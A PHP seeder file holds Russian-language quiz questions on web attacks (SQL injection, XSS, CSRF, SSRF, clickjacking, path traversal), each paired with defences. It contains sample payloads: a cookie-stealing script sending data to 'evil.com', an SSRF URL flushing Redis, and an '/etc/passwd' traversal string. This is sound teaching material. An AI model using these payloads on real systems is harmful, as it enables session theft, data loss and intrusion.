<?php

namespace Database\Seeders\Data\Categories\Security;

class WebAttacks
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SQL-инъекция простыми словами?',
                'answer' => 'Атакующий вставляет SQL-код в пользовательский ввод, который попадает в запрос как часть SQL, а не как данные. "SELECT * FROM users WHERE id = $_GET[id]" + ввод 1 OR 1=1 — выберется ВСЁ. Защита — prepared statements: значения передаются ОТДЕЛЬНО от шаблона запроса.',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое XSS простыми словами?',
                'answer' => 'Cross-Site Scripting — атакующий вставляет JS-код в ваш HTML через пользовательский ввод. Пример: в комментарии написал <script>fetch("evil.com/steal?c="+document.cookie)</script>. У всех, кто откроет страницу, скрипт украдёт куки. Защита — экранирование вывода: htmlspecialchars() или {{ $var }} в Blade.',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Какие виды XSS бывают?',
                'answer' => '1) Stored (persistent) — вредоносный код сохраняется в БД (комментарий, профиль) и показывается всем посетителям. 2) Reflected — код в URL/параметре, исполняется один раз на странице, открытой через подложенную ссылку. 3) DOM-based — атака чисто на клиенте через манипуляцию DOM-ом без отправки на сервер.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое CSRF простыми словами?',
                'answer' => 'Cross-Site Request Forgery — атакующий заставляет залогиненного пользователя выполнить действие на твоём сайте без его ведома. Жертва открывает сайт атакующего, тот отправляет POST на твой сайт — куки автоматически прилагаются. Защита — CSRF-токен в форме, который сервер проверяет.',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SSRF простыми словами?',
                'answer' => 'Server-Side Request Forgery — атакующий заставляет твой сервер послать запрос куда ему нужно. Пример: на твоём сайте есть «предпросмотр URL», пользователь даёт http://localhost:6379/FLUSHALL — сервер из своей сети дёргает внутренний Redis. Защита: whitelist разрешённых доменов, блок 127.0.0.1/приватных IP.',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое clickjacking простыми словами?',
                'answer' => 'Атака, при которой твой сайт встраивается в <iframe> на сайте атакующего, тот накладывает поверх свои элементы. Пользователь думает, что кликает на кнопку «Скачать», а на самом деле — на «Удалить аккаунт» в твоём сайте. Защита: заголовок X-Frame-Options: DENY или CSP frame-ancestors.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое path traversal простыми словами?',
                'answer' => 'Атакующий через user-input выходит за пределы разрешённой папки. Пример: file_get_contents("uploads/" . $_GET[file]) + ввод ../../../etc/passwd. Защита: basename() входа, проверка realpath()-результата на префикс, whitelist разрешённых имён.',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
        ];
    }
}
